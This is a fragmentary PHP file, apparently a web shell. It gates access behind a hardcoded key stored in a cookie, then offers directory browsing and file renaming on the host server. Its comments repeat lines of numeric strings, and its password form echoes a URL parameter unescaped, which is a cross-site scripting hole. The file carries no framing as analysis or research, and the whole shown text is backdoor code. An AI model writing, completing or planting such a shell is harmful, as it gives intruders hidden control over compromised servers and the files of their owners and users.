...
$auth_key = "c74226990013632e242ab8a2f8527c56";
...
$pass = false;
if (isset($_COOKIE['pw_name_97428'])) {
    if(($_COOKIE['pw_name_97428']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_97428'])) {
        if(($_POST['pw_name_97428']) == $auth_key) {
            setcookie("pw_name_97428", $_POST['pw_name_97428']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_97428' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1722496762742528 1722496762649443 1722496762975807 1722496762357724
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1722496762742528 1722496762649443 1722496762975807 1722496762357724
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1722496762742528 1722496762649443 1722496762975807 1722496762357724
            $name = PATH . "/" . $_GET['r'];
